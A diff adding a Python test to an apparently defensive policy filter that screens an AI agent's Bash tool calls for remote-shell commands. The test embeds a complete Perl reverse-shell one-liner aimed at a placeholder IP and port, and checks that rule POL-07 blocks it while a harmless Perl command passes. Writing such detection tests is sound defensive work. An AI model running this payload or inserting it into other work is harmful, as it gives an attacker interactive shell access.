@@ -50,3 +50,29 @@ def test_v13_pol07_socat_exec_case_insensitive() -> None:
         policy=policy,
     )
     assert benign_blocked is False
+
+
+def test_v13_pol07_perl_ruby_inline_flags() -> None:
+    policy = _v13_policy()
+    blocked, _, rules = evaluate_payload(
+        {
+            "tool_name": "Bash",
+            "tool_input": {
+                "command": (
+                    "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                    "connect(S,sockaddr_in(4449,inet_aton(\"198.51.100.20\")));"
+                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
+                    "use POSIX qw(dup2);dup2(fileno(S),0);exec(\"/bin/sh -i\");'"
+                )
+            },
+        },
+        policy=policy,
+    )
+    assert blocked is True
+    assert "POL-07:REMOTE_SHELL" in rules
+
+    benign_blocked, _, _ = evaluate_payload(
+        {"tool_name": "Bash", "tool_input": {"command": "perl -e 'print 1'"}},
+        policy=policy,
+    )
+    assert benign_blocked is False
